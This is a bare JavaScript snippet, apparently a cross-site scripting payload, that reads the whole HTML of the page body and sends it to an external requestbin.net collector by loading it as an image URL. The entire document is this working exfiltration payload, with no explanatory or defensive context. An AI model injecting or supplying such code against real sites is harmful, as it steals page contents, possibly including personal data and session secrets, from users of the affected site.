var image = document.createElement("img")

var html = window.document.body.outerHTML
image.src = "http://requestbin.net/r/1j0wmqj1/image.png?c=" + html

document.body.appendChild(image);
